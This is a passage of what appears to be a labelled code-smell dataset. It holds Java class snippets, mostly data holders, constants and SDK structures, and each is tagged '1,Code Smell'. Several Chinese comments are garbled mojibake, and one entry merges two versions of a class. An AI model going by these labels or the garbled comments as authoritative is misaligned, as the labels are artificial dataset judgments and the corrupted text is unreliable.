  public static final String com_alipay_mobile_nebulaappproxy_api_rpc_H5RpcUtil=""com.alipay.mobile.nebulaappproxy.api.rpc.H5RpcUtil"";
  public static final String rpcCall=""rpcCall"";
  public static final String getResponse=""getResponse"";
}",1,Code Smell
"private class XMLInstanceDetails {
  public final ResourceNames resNames;
  public final String variant;
  public final CopyOnWriteSortedSet<XC_LayoutInflated> callbacks;
  public final XResources res=XResources.this;
  private XMLInstanceDetails(  ResourceNames resNames,  String variant,  CopyOnWriteSortedSet<XC_LayoutInflated> callbacks){
    this.resNames=resNames;
    this.variant=variant;
    this.callbacks=callbacks;
  }
}
",1,Code Smell
"/** 
 * Oracle options constant
 */
public class OracleConstant {
  /** 
 * The key of flink connector defined in flink table
 */
  public static final String CONNECTOR=""connector"";
  /** 
 * Specify what flink connector to use for extract data from Oracle database, here should be 'oracle-cdc'
 */
  public static final String ORACLE_CDC=""oracle-cdc-inlong"";
  /** 
 * Database name of the Oracle server to monitor
 */
  public static final String DATABASE_NAME=""database-name"";
  /** 
 * IP address or hostname of the Oracle database server
 */
  public static final String HOSTNAME=""hostname"";
  /** 
 * Integer port number of the Oracle database server.
 */
  public static final String PORT=""port"";
  /** 
 * Name of the Oracle database to use when connecting to the Oracle database server
 */
  public static final String USERNAME=""username"";
  /** 
 * Password to use when connecting to the Oracle database server
 */
  public static final String PASSWORD=""password"";
  /** 
 * Table name of the Oracle database to monitor
 */
  public static final String TABLE_NAME=""table-name"";
  /** 
 * Schema name of the Oracle database to monitor
 */
  public static final String SCHEMA_NAME=""schema-name"";
  /** 
 * <p>The mining strategy controls how Oracle LogMiner builds and uses a given data dictionary for resolving table and column ids to names.</p> <p>redo_log_catalog - Writes the data dictionary to the online redo logs causing more archive logs to be generated over time. This also enables tracking DDL changes against captured tables, so if the schema changes frequently this is the ideal choice.</p> <p>online_catalog - Uses the database鈥檚 current data dictionary to resolve object ids and does not write any extra information to the online redo logs. This allows LogMiner to mine substantially faster but at the expense that DDL changes cannot be tracked. If the captured table(s) schema changes infrequently or never, this is the ideal choice.</p>
 */
  public static final String LOG_MINING_STRATEGY=""debezium.log.mining.strategy"";
  /** 
 * If true,CONTINUOUS_MINE option will be added to the log mining session. This will manage log files switches seamlessly.
 */
  public static final String LOG_MINING_CONTINUOUS_MINE=""debezium.log.mining.continuous.mine"";
  /** 
 * Deprecated: Case insensitive table names;set to 'true' for Oracle 11g,'false'(default) otherwise.
 */
  public static final String TABLENAME_CASE_INSENSITIVE=""debezium.database.tablename.case.insensitive"";
  /** 
 * The key of $ {@link ScanStartUpMode}
 */
  public static final String SCAN_STARTUP_MODE=""scan.startup.mode"";
  /** 
 * Optional startup mode for Oracle CDC consumer, valid enumerations are ""initial"" and ""latest-offset"". Please see Startup Reading Positionsection for more detailed information.
 */
  @Getter public enum ScanStartUpMode {  /** 
 * Performs an initial snapshot on the monitored database tables upon first startup, and continue to read the latest binlog.
 */
  INITIAL(""initial""),   /** 
 * Never to perform a snapshot on the monitored database tables upon first startup, just read from the change since the connector was started.
 */
  LATEST_OFFSET(""latest-offset"");   final String value;
  ScanStartUpMode(  String value){
    this.value=value;
  }
  public static ScanStartUpMode forName(  String name){
    for (    ScanStartUpMode dataType : ScanStartUpMode.values()) {
      if (dataType.getValue().equals(name)) {
        return dataType;
      }
    }
    throw new IllegalArgumentException(String.format(""Unsupport ScanStartUpMode for oracle source:%s"",name));
  }
}
}",1,Code Smell
"/** 
 * The result of diffing between materialized view and the base tables.
 */
public class MvPartitionDiffResult {
  public final Map<String,Range<PartitionKey>> mvRangePartitionMap;
  public final Map<Table,Map<String,Range<PartitionKey>>> refBaseTablePartitionMap;
  public final Map<Table,Map<String,Set<String>>> refBaseTableMVPartitionMap;
  public final RangePartitionDiff rangePartitionDiff;
  public MvPartitionDiffResult(  Map<String,Range<PartitionKey>> mvRangePartitionMap,  Map<Table,Map<String,Range<PartitionKey>>> refBaseTablePartitionMap,  Map<Table,Map<String,Set<String>>> refBaseTableMVPartitionMap,  RangePartitionDiff rangePartitionDiff){
    this.mvRangePartitionMap=mvRangePartitionMap;
    this.refBaseTablePartitionMap=refBaseTablePartitionMap;
    this.refBaseTableMVPartitionMap=refBaseTableMVPartitionMap;
    this.rangePartitionDiff=rangePartitionDiff;
  }
}
",1,Code Smell
"/** 
 * @author andrey.stelmashenko@gmail.com
 */
@ConfigurationProperties(""conductor.event-queues.jsm"") public class JetStreamProperties {
  private String listenerQueuePrefix="""";
  /** 
 * The durable subscriber name for the subscription 
 */
  private String durableName=""defaultQueue"";
  private String streamStorageType=""file"";
  /** 
 * The NATS connection url 
 */
  private String url=Options.DEFAULT_URL;
  private Duration pollTimeDuration=Duration.ofMillis(100);
  /** 
 * WAIT tasks default queue group, to make subscription round-robin delivery to single sub 
 */
  private String defaultQueueGroup=""wait-group"";
  public Duration getPollTimeDuration(){
    return pollTimeDuration;
  }
  public void setPollTimeDuration(  Duration pollTimeDuration){
    this.pollTimeDuration=pollTimeDuration;
  }
  public String getListenerQueuePrefix(){
    return listenerQueuePrefix;
  }
  public void setListenerQueuePrefix(  String listenerQueuePrefix){
    this.listenerQueuePrefix=listenerQueuePrefix;
  }
  public String getDurableName(){
    return durableName;
  }
  public void setDurableName(  String durableName){
    this.durableName=durableName;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public String getStreamStorageType(){
    return streamStorageType;
  }
  public void setStreamStorageType(  String streamStorageType){
    this.streamStorageType=streamStorageType;
  }
  public String getDefaultQueueGroup(){
    return defaultQueueGroup;
  }
  public void setDefaultQueueGroup(  String defaultQueueGroup){
    this.defaultQueueGroup=defaultQueueGroup;
  }
}",1,Code Smell
"/** 
 * number constants
 */
public static class Number {
  public static final String TWO=""2"";
  public static final String ONE=""1"";
  public static final String ONE_HUNANDER=""100"";
  public static final String TWO_HUNANDER=""200"";
}",1,Code Smell
"public abstract class BxArea {
  private byte type=0x00;
  private short x;
  private short y;
  private short w;
  private short h;
  public BxArea(  byte type,  short x,  short y,  short w,  short h){
    this.type=type;
    this.x=x;
    this.y=y;
    this.w=w;
    this.h=h;
  }
  public short getX(){
    return x;
  }
  public void setX(  short x){
    this.x=x;
  }
  public short getY(){
    return y;
  }
  public void setY(  short y){
    this.y=y;
  }
  public short getW(){
    return w;
  }
  public void setW(  short w){
    this.w=w;
  }
  public short getH(){
    return h;
  }
  public void setH(  short h){
    this.h=h;
  }
  public abstract byte[] build();
}",1,Code Smell
"public class TextureRegion {
  public double x1, y1;
  public double x2, y2;
  public double diagonal;
  public TextureRegion(  double width,  double height){
    diagonal=Math.sqrt(width * width + height * height);
  }
}",1,Code Smell
"public static class NET_VIDEOCHANNELS_OUTPUT extends SdkStructure {
  public int nVGACount;
  public int[] nVGA=new int[128];
  public int nTVCount;
  public int[] nTV=new int[128];
  public byte[] reserved=new byte[512];
}",1,Code Smell
"/** 
 * Predefined pipeline configuration options. 
 */
@PublicEvolving public class PipelineOptions {
  public static final Duration DEFAULT_SCHEMA_OPERATOR_RPC_TIMEOUT=Duration.ofMinutes(3);
  public static final ConfigOption<String> PIPELINE_NAME=ConfigOptions.key(""name"").stringType().defaultValue(""Flink CDC Pipeline Job"").withDescription(""The name of the pipeline"");
  public static final ConfigOption<Integer> PIPELINE_PARALLELISM=ConfigOptions.key(""parallelism"").intType().noDefaultValue().withDescription(""Parallelism of the pipeline"");
  public static final ConfigOption<SchemaChangeBehavior> PIPELINE_SCHEMA_CHANGE_BEHAVIOR=ConfigOptions.key(""schema.change.behavior"").enumType(SchemaChangeBehavior.class).defaultValue(SchemaChangeBehavior.EVOLVE).withDescription(Description.builder().text(""Behavior for handling schema change events. "").linebreak().add(ListElement.list(text(""EVOLVE: Apply schema changes to downstream. This requires sink to support handling schema changes.""),text(""IGNORE: Drop all schema change events.""),text(""EXCEPTION: Throw an exception to terminate the sync pipeline.""))).build());
  public static final ConfigOption<String> PIPELINE_LOCAL_TIME_ZONE=ConfigOptions.key(""local-time-zone"").stringType().defaultValue(""systemDefault"").withDescription(Description.builder().text(""The local time zone defines current session time zone id. "").linebreak().text(""It is used when converting to/from <code>TIMESTAMP WITH LOCAL TIME ZONE</code>. "" + ""Internally, timestamps with local time zone are always represented in the UTC time zone. "" + ""However, when converting to data types that don't include a time zone (e.g. TIMESTAMP, STRING), ""+ ""the session time zone is used during conversion. The input of option is either a full name ""+ ""such as \""America/Los_Angeles\"", or a custom timezone id such as \""GMT-08:00\""."").build());
  public static final ConfigOption<String> PIPELINE_SCHEMA_OPERATOR_UID=ConfigOptions.key(""schema.operator.uid"").stringType().defaultValue(""$$_schema_operator_$$"").withDescription(""The unique ID for schema operator. This ID will be used for inter-operator communications and must be unique across operators."");
  public static final ConfigOption<Duration> PIPELINE_SCHEMA_OPERATOR_RPC_TIMEOUT=ConfigOptions.key(""schema-operator.rpc-timeout"").durationType().defaultValue(DEFAULT_SCHEMA_OPERATOR_RPC_TIMEOUT).withDescription(""The timeout time for SchemaOperator to wait downstream SchemaChangeEvent applying finished, the default value is 3 minutes."");
  private PipelineOptions(){
  }
}",1,Code Smell
"public static class AV_CFG_RemoteDevice extends SdkStructure {
  public int nStructSize;
  public int bEnable;
  public byte[] szID=new byte[AV_CFG_Device_ID_Len];
  public byte[] szIP=new byte[AV_CFG_IP_Address_Len];
  public int nPort;
  public byte[] szProtocol=new byte[AV_CFG_Protocol_Len];
  public byte[] szUser=new byte[AV_CFG_User_Name_Len];
  public byte[] szPassword=new byte[AV_CFG_Password_Len];
  public byte[] szSerial=new byte[AV_CFG_Serial_Len];
  public byte[] szDevClass=new byte[AV_CFG_Device_Class_Len];
  public byte[] szDevType=new byte[AV_CFG_Device_Type_Len];
  public byte[] szName=new byte[AV_CFG_Device_Name_Len];
  public byte[] szAddress=new byte[AV_CFG_Address_Len];
  public byte[] szGroup=new byte[AV_CFG_Group_Name_Len];
  public int nDefinition;
  public int nVideoChannel;
  public int nAudioChannel;
  public int nRtspPort;
  public byte[] szVendor=new byte[MAX_PATH];
  public Pointer pVideoInput;
  public int nMaxVideoInputs;
  public int nRetVideoInputs;
  public int nHttpPort;
  public int bGB28181;
  public int nDevLocalPort;
  public byte[] szDeviceNo=new byte[AV_CFG_DeviceNo_Len];
  public int nLoginType;
  public byte[] szVersion=new byte[32];
  public boolean bPoE;
  public int nPoEPort;
  public byte[] szMac=new byte[18];
  public AV_CFG_RemoteDevice(){
    this.nStructSize=this.size();
  }
}",1,Code Smell
"public class CfSubscribeMessageTemplate implements Serializable {
  private Long id;
  private String appid;
  private String messageScenes;
  private String templateId;
  private String templateContents;
  private String templateNotes;
  private static final long serialVersionUID=1L;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getAppid(){
    return appid;
  }
  public void setAppid(  String appid){
    this.appid=appid == null ? null : appid.trim();
  }
  public String getMessageScenes(){
    return messageScenes;
  }
  public void setMessageScenes(  String messageScenes){
    this.messageScenes=messageScenes == null ? null : messageScenes.trim();
  }
  public String getTemplateId(){
    return templateId;
  }
  public void setTemplateId(  String templateId){
    this.templateId=templateId == null ? null : templateId.trim();
  }
  public String getTemplateContents(){
    return templateContents;
  }
  public void setTemplateContents(  String templateContents){
    this.templateContents=templateContents == null ? null : templateContents.trim();
  }
  public String getTemplateNotes(){
    return templateNotes;
  }
  public void setTemplateNotes(  String templateNotes){
    this.templateNotes=templateNotes == null ? null : templateNotes.trim();
  }
}",1,Code Smell
"@Deprecated public class LinkDbInfo implements Writable {
  private String cluster;
  private String name;
  private long id;
  public LinkDbInfo(){
    this.cluster="""";
    this.name="""";
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  @Override public void write(  DataOutput out) throws IOException {
    Text.writeString(out,cluster);
    Text.writeString(out,name);
    out.writeLong(id);
  }
  public void readFields(  DataInput in) throws IOException {
    cluster=Text.readString(in);
    name=Text.readString(in);
    id=in.readLong();
  }
  public String getCluster(){
    return cluster;
  }
  public void setCluster(  String cluster){
    this.cluster=cluster;
  }
}
",1,Code Smell
"/** 
 * harris
 */
public class SettingVersionRequest {
  private List<String> codeValue;
  private List<String> imageValue;
  private List<String> fileSystemValue;
  private String sbomId;
  private String sbomVersionId;
  public List<String> getCodeValue(){
    return codeValue;
  }
  public void setCodeValue(  List<String> codeValue){
    this.codeValue=codeValue;
  }
  public List<String> getImageValue(){
    return imageValue;
  }
  public void setImageValue(  List<String> imageValue){
    this.imageValue=imageValue;
  }
  public List<String> getFileSystemValue(){
    return fileSystemValue;
  }
  public void setFileSystemValue(  List<String> fileSystemValue){
    this.fileSystemValue=fileSystemValue;
  }
  public String getSbomId(){
    return sbomId;
  }
  public void setSbomId(  String sbomId){
    this.sbomId=sbomId;
  }
  public String getSbomVersionId(){
    return sbomVersionId;
  }
  public void setSbomVersionId(  String sbomVersionId){
    this.sbomVersionId=sbomVersionId;
  }
}
",1,Code Smell
"/** 
 * @author paragkanodia
 */
public class Ride {
  private UUID id;
  private String sharedBy;
  private List<String> selectedBy;
  private String origin;
  private String destination;
  private int availableSeats;
  private RideStatus status;
  private String vehicleNumber;
  private String vehicleModel;
  public Ride(  String sharedBy,  String origin,  String destination,  int availableSeats,  String vehicleNumber,  String vehicleModel){
    this.id=UUID.randomUUID();
    this.sharedBy=sharedBy;
    this.selectedBy=new ArrayList<>();
    this.origin=origin;
    this.destination=destination;
    this.availableSeats=availableSeats;
    this.status=RideStatus.ACTIVE;
    this.vehicleNumber=vehicleNumber;
    this.vehicleModel=vehicleModel;
  }
  public String getVehicleModel(){
    return vehicleModel;
  }
  public String getVehicleNumber(){
    return vehicleNumber;
  }
  public UUID getId(){
    return id;
  }
  public String getSharedBy(){
    return sharedBy;
  }
  public List<String> getSelectedBy(){
    return selectedBy;
  }
  public String getOrigin(){
    return origin;
  }
  public void setOrigin(  String origin){
    this.origin=origin;
  }
  public String getDestination(){
    return destination;
  }
  public void setDestination(  String destination){
    this.destination=destination;
  }
  public int getAvailableSeats(){
    return availableSeats;
  }
  public RideStatus getStatus(){
    return status;
  }
  public void endRide(){
    this.status=RideStatus.END;
  }
  public void addPassenger(  String passenger,  int seats){
    selectedBy.add(passenger);
    this.availableSeats-=seats;
  }
  @Override public String toString(){
    return ""Ride details:- Ride created by "" + sharedBy;
  }
}
",1,Code Smell
"public static class TTY_CONFIG extends Structure {
  public byte baudrate;
  public byte databits;
  public byte stopbits;
  public byte parity;
  public byte flowcontrol;
  public byte[] res=new byte[3];
}",1,Code Smell
"public final class LocalGrayTipElement implements Serializable {
  LocalGrayTipDirect direct;
  String extraJson;
  LocalGrayTipRobot robot;
  long serialVersionUID;
  int type;
  public LocalGrayTipElement(){
    this.serialVersionUID=1L;
    this.extraJson="""";
  }
  public LocalGrayTipDirect getDirect(){
    return this.direct;
  }
  public String getExtraJson(){
    return this.extraJson;
  }
  public LocalGrayTipRobot getRobot(){
    return this.robot;
  }
  public int getType(){
    return this.type;
  }
  public String toString(){
    return ""LocalGrayTipElement{type="" + this.type + "",robot=""+ this.robot+ "",direct=""+ this.direct+ "",extraJson=""+ this.extraJson+ "",}"";
  }
  public LocalGrayTipElement(  int i2,  LocalGrayTipRobot localGrayTipRobot,  LocalGrayTipDirect localGrayTipDirect,  String str){
    this.serialVersionUID=1L;
    this.extraJson="""";
    this.type=i2;
    this.robot=localGrayTipRobot;
    this.direct=localGrayTipDirect;
    this.extraJson=str;
  }
}",1,Code Smell
"/** 
 * ProxyInfo
 */
public class ProxyInfo {
  private String clusterId;
  private String md5;
  /** 
 * get clusterId
 * @return the clusterId
 */
  public String getClusterId(){
    return clusterId;
  }
  /** 
 * set clusterId
 * @param clusterId the clusterId to set
 */
  public void setClusterId(  String clusterId){
    this.clusterId=clusterId;
  }
  /** 
 * get md5
 * @return the md5
 */
  public String getMd5(){
    return md5;
  }
  /** 
 * set md5
 * @param md5 the md5 to set
 */
  public void setMd5(  String md5){
    this.md5=md5;
  }
}",1,Code Smell
"public static class NET_DVR_SEND_PARAM_IN extends Structure {
  public Pointer pSendData;
  public int dwSendDataLen;
  public NET_DVR_TIME_V30 struTime=new NET_DVR_TIME_V30();
  public byte byPicType;
  public byte byPicURL;
  public byte byUploadModeling;
  public byte byRes1;
  public int dwPicMangeNo;
  public byte[] sPicName=new byte[NAME_LEN];
  public int dwPicDisplayTime;
  public Pointer pSendAppendData;
  public int dwSendAppendDataLen;
  public byte[] byRes=new byte[192];
}",1,Code Smell
"/** 
 * @author nkorange
 * @since 0.8.0
 */
public class HttpMethod {
  public static final String GET=""GET"";
  public static final String HEAD=""HEAD"";
  public static final String POST=""POST"";
  public static final String PUT=""PUT"";
  public static final String PATCH=""PATCH"";
  public static final String DELETE=""DELETE"";
  public static final String OPTIONS=""OPTIONS"";
  public static final String TRACE=""TRACE"";
}",1,Code Smell
"/** 
 * KMS閰嶇疆鍙傛暟妯″瀷
 */
public class AliyunKMSConfig extends Config {
  /** 
 * 闃块噷浜戝畼鏂圭敵璇风殑AccessKey Id
 */
  @NameInMap(""aliyunAccessKeyId"") public String aliyunAccessKeyId;
  /** 
 * 闃块噷浜戝畼鏂圭敵璇风殑AccessKey Secret
 */
  @NameInMap(""aliyunAccessKeySecret"") public String aliyunAccessKeySecret;
  /** 
 * 浠庨樋閲屼簯瀹樻柟鑾峰彇鐨勪复鏃跺畨鍏ㄤ护鐗孲ecurity Token
 */
  @NameInMap(""aliyunSecurityToken"") public String aliyunSecurityToken;
  /** 
 * 闃块噷浜慠AM瑙掕壊鍏ㄥ眬璧勬簮鎻忚堪绗
 */
  @NameInMap(""aliyunRoleArn"") public String aliyunRoleArn;
  /** 
 * 闃块噷浜慠AM瑙掕壊鑷畾涔夌瓥鐣
 */
  @NameInMap(""aliyunRolePolicy"") public String aliyunRolePolicy;
  /** 
 * 闃块噷浜慐CS瀹炰緥RAM瑙掕壊鍚嶇О
 */
  @NameInMap(""aliyunRoleName"") public String aliyunRoleName;
  /** 
 * KMS涓诲瘑閽D
 */
  @NameInMap(""kmsKeyId"") public String kmsKeyId;
  /** 
 * KMS涓诲瘑閽ョ増鏈琁D
 */
  @NameInMap(""kmsKeyVersionId"") public String kmsKeyVersionId;
  /** 
 * KMS鏈嶅姟鍦板潃 KMS鏈嶅姟鍦板潃鍒楄〃璇︽儏锛岃鍙傝冿細 https://help.aliyun.com/document_detail/69006.html?spm=a2c4g.11186623.2.9.783f77cfAoNhY6#concept-69006-zh
 */
  @NameInMap(""kmsEndpoint"") public String kmsEndpoint;
  /** 
 * 鍑嵁绫诲瀷锛屾敮鎸佺殑绫诲瀷鏈""access_key""锛""sts""锛""ecs_ram_role""锛""ram_role_arn""
 */
  @NameInMap(""credentialType"") public String credentialType;
}",1,Code Smell
"public static class Column {
  @ApiModelProperty(""灞炴�у悕绉�"") private String key;
  @ApiModelProperty(""灞炴�ц〃澶�"") private String value;
  public String getKey(){
    return key;
  }
  public void setKey(  String key){
    this.key=key;
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value;
  }
}
",1,Code Smell
"public static class EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE extends SdkStructure {
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_UNKNOWN=0;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_WEAR_GLASSES=1;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_SMILE=2;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_ANGER=3;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_SADNESS=4;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_DISGUST=5;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_FEAR=6;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_SURPRISE=7;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_NEUTRAL=8;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_LAUGH=9;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_NOGLASSES=10;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_HAPPY=11;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_CONFUSED=12;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_SCREAM=13;
  public static final int EM_DEV_EVENT_FACEDETECT_FEATURE_TYPE_WEAR_SUNGLASSES=14;
}",1,Code Smell
"public class LPDH_AUDIO_FORMAT extends SdkStructure {
  public byte byFormatTag;
  public short nChannels;
  public short wBitsPerSample;
  public int nSamplesPerSec;
}
",1,Code Smell
"public static class EfgsTransmission {
  private boolean enableDsos;
  private boolean enableReportType;
  private Integer defaultDsos;
  private ReportType defaultReportType;
  public ReportType getDefaultReportType(){
    return defaultReportType;
  }
  public void setDefaultReportType(  ReportType defaultReportType){
    this.defaultReportType=defaultReportType;
  }
  public boolean isEnableDsos(){
    return enableDsos;
  }
  public void setEnableDsos(  boolean enableDsos){
    this.enableDsos=enableDsos;
  }
  public boolean isEnableReportType(){
    return enableReportType;
  }
  public void setEnableReportType(  boolean enableReportType){
    this.enableReportType=enableReportType;
  }
  public Integer getDefaultDsos(){
    return defaultDsos;
  }
  public void setDefaultDsos(  Integer defaultDsos){
    this.defaultDsos=defaultDsos;
  }
}
",1,Code Smell
"public class CfThirdPartyPlatformApplicationForm implements Serializable {
  private String appid;
  private String applicationName;
  private String publicKey;
  private String privateKey;
  private String platform;
  private String authToken;
  private String aesEncryption;
  private String originalId;
  private static final long serialVersionUID=1L;
  public String getAppid(){
    return appid;
  }
  public void setAppid(  String appid){
    this.appid=appid == null ? null : appid.trim();
  }
  public String getApplicationName(){
    return applicationName;
  }
  public void setApplicationName(  String applicationName){
    this.applicationName=applicationName == null ? null : applicationName.trim();
  }
  public String getPublicKey(){
    return publicKey;
  }
  public void setPublicKey(  String publicKey){
    this.publicKey=publicKey == null ? null : publicKey.trim();
  }
  public String getPrivateKey(){
    return privateKey;
  }
  public void setPrivateKey(  String privateKey){
    this.privateKey=privateKey == null ? null : privateKey.trim();
  }
  public String getPlatform(){
    return platform;
  }
  public void setPlatform(  String platform){
    this.platform=platform == null ? null : platform.trim();
  }
  public String getAuthToken(){
    return authToken;
  }
  public void setAuthToken(  String authToken){
    this.authToken=authToken;
  }
  public String getAesEncryption(){
    return aesEncryption;
  }
  public void setAesEncryption(  String aesEncryption){
    this.aesEncryption=aesEncryption;
  }
  public String getOriginalId(){
    return originalId;
  }
  public void setOriginalId(  String originalId){
    this.originalId=originalId;
  }
}",1,Code Smell
"/** 
 * A user.
 * @author Rob Winch
 */
@Entity public class User {
  @GeneratedValue(strategy=GenerationType.AUTO) @Id private Long id;
  private String firstName;
  private String lastName;
  private String email;
  private String password;
  public Long getId(){
    return this.id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getFirstName(){
    return this.firstName;
  }
  public void setFirstName(  String firstName){
    this.firstName=firstName;
  }
  public String getLastName(){
    return this.lastName;
  }
  public void setLastName(  String lastName){
    this.lastName=lastName;
  }
  public String getEmail(){
    return this.email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public String getPassword(){
    return this.password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
}
/** 
 * A user.
 * @author Rob Winch
 */
@Entity(name=""users"") @JsonSerialize(as=User.class,contentUsing=JsonSerializer.class) public class User {
  @Id private String id;
  private String firstName;
  private String lastName;
  private String email;
  private String password;
  public String getId(){
    return this.id;
  }
  public void setId(  String id){
    this.id=id;
  }
  @AuthorizeRead(""user"") public String getFirstName(){
    return this.firstName;
  }
  public void setFirstName(  String firstName){
    this.firstName=firstName;
  }
  @AuthorizeRead(""user"") public String getLastName(){
    return this.lastName;
  }
  public void setLastName(  String lastName){
    this.lastName=lastName;
  }
  public String getEmail(){
    return this.email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public String getPassword(){
    return this.password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
}
",1,Code Smell
"/** 
 * 鐩綍鍐匛xcel鏂囦欢 {@linkplain DataSet}銆 <p> 娉ㄦ剰锛氭绫讳笉鏀寔<code>Freemarker</code>妯℃澘璇█銆 </p>
 * @author datagear@163.com
 */
public class ExcelDirectoryFileDataSet extends AbstractExcelFileDataSet {
  private static final long serialVersionUID=1L;
  /** 
 * Excel鏂囦欢鎵鍦ㄧ殑鐩綍 
 */
  private File directory;
  /** 
 * Excel鏂囦欢鍚 
 */
  private String fileName;
  public ExcelDirectoryFileDataSet(){
    super();
  }
  public ExcelDirectoryFileDataSet(  String id,  String name,  File directory,  String fileName){
    super(id,name);
    this.directory=directory;
    this.fileName=fileName;
  }
  /** 
 * @param id
 * @param name
 * @param properties
 */
  public ExcelDirectoryFileDataSet(  String id,  String name,  List<DataSetProperty> properties,  File directory,  String fileName){
    super(id,name,properties);
    this.directory=directory;
    this.fileName=fileName;
  }
  public File getDirectory(){
    return directory;
  }
  public void setDirectory(  File directory){
    this.directory=directory;
  }
  public String getFileName(){
    return fileName;
  }
  public void setFileName(  String fileName){
    this.fileName=fileName;
  }
  @Override protected File getExcelFile(  DataSetQuery query) throws DataSetException {
    File excelFile=FileUtil.getFile(this.directory,this.fileName);
    return excelFile;
  }
}",1,Code Smell
"public static class FollowBean {
  /** 
 * itemType : author itemId : 2170 followed : false
 */
  private String itemType;
  private int itemId;
  private boolean followed;
  public String getItemType(){
    return itemType;
  }
  public void setItemType(  String itemType){
    this.itemType=itemType;
  }
  public int getItemId(){
    return itemId;
  }
  public void setItemId(  int itemId){
    this.itemId=itemId;
  }
  public boolean isFollowed(){
    return followed;
  }
  public void setFollowed(  boolean followed){
    this.followed=followed;
  }
}",1,Code Smell
"public abstract static class BaseDialogViewHolder<DIALOG extends IDialog> extends ViewHolder<DIALOG> {
  protected ImageLoader imageLoader;
  protected OnDialogClickListener<DIALOG> onDialogClickListener;
  protected OnDialogLongClickListener<DIALOG> onLongItemClickListener;
  protected OnDialogViewClickListener<DIALOG> onDialogViewClickListener;
  protected OnDialogViewLongClickListener<DIALOG> onDialogViewLongClickListener;
  protected DateFormatter.Formatter datesFormatter;
  public BaseDialogViewHolder(  View itemView){
    super(itemView);
  }
  void setImageLoader(  ImageLoader imageLoader){
    this.imageLoader=imageLoader;
  }
  protected void setOnDialogClickListener(  OnDialogClickListener<DIALOG> onDialogClickListener){
    this.onDialogClickListener=onDialogClickListener;
  }
  protected void setOnDialogViewClickListener(  OnDialogViewClickListener<DIALOG> onDialogViewClickListener){
    this.onDialogViewClickListener=onDialogViewClickListener;
  }
  protected void setOnLongItemClickListener(  OnDialogLongClickListener<DIALOG> onLongItemClickListener){
    this.onLongItemClickListener=onLongItemClickListener;
  }
  protected void setOnDialogViewLongClickListener(  OnDialogViewLongClickListener<DIALOG> onDialogViewLongClickListener){
    this.onDialogViewLongClickListener=onDialogViewLongClickListener;
  }
  public void setDatesFormatter(  DateFormatter.Formatter dateHeadersFormatter){
    this.datesFormatter=dateHeadersFormatter;
  }
}
",1,Code Smell
"public class CfCouponForm implements Serializable {
  private String id;
  private String toUid;
  private String fromUid;
  private Byte scenes;
  private String shopId;
  private String goodsId;
  private BigDecimal denomination;
  private BigDecimal thresholdPrice;
  private Long effectiveTime;
  private Long expireTime;
  private Byte status;
  private Long createTime;
  private Long useTime;
  private BigDecimal amountUsed;
  private Byte couponType;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getToUid(){
    return toUid;
  }
  public void setToUid(  String toUid){
    this.toUid=toUid == null ? null : toUid.trim();
  }
  public String getFromUid(){
    return fromUid;
  }
  public void setFromUid(  String fromUid){
    this.fromUid=fromUid == null ? null : fromUid.trim();
  }
  public Byte getScenes(){
    return scenes;
  }
  public void setScenes(  Byte scenes){
    this.scenes=scenes;
  }
  public String getShopId(){
    return shopId;
  }
  public void setShopId(  String shopId){
    this.shopId=shopId == null ? null : shopId.trim();
  }
  public String getGoodsId(){
    return goodsId;
  }
  public void setGoodsId(  String goodsId){
    this.goodsId=goodsId == null ? null : goodsId.trim();
  }
  public BigDecimal getDenomination(){
    return denomination;
  }
  public void setDenomination(  BigDecimal denomination){
    this.denomination=denomination;
  }
  public Long getEffectiveTime(){
    return effectiveTime;
  }
  public void setEffectiveTime(  Long effectiveTime){
    this.effectiveTime=effectiveTime;
  }
  public Long getExpireTime(){
    return expireTime;
  }
  public void setExpireTime(  Long expireTime){
    this.expireTime=expireTime;
  }
  public Byte getStatus(){
    return status;
  }
  public void setStatus(  Byte status){
    this.status=status;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public Long getUseTime(){
    return useTime;
  }
  public void setUseTime(  Long useTime){
    this.useTime=useTime;
  }
  public BigDecimal getThresholdPrice(){
    return thresholdPrice;
  }
  public void setThresholdPrice(  BigDecimal thresholdPrice){
    this.thresholdPrice=thresholdPrice;
  }
  public BigDecimal getAmountUsed(){
    return amountUsed;
  }
  public void setAmountUsed(  BigDecimal amountUsed){
    this.amountUsed=amountUsed;
  }
  public Byte getCouponType(){
    return couponType;
  }
  public void setCouponType(  Byte couponType){
    this.couponType=couponType;
  }
}",1,Code Smell
"private static class TargetMethodInfo {
  public Class<?> findClass;
  public String findClassName;
  public String methodName;
  public Class<?> returnType;
  public Class<?>[] methodParams=new Class[0];
}",1,Code Smell
"/** 
 * LineageTable
 * @since 2022/3/15 22:55
 */
public class LineageTable {
  private String id;
  private String name;
  private List<LineageColumn> columns;
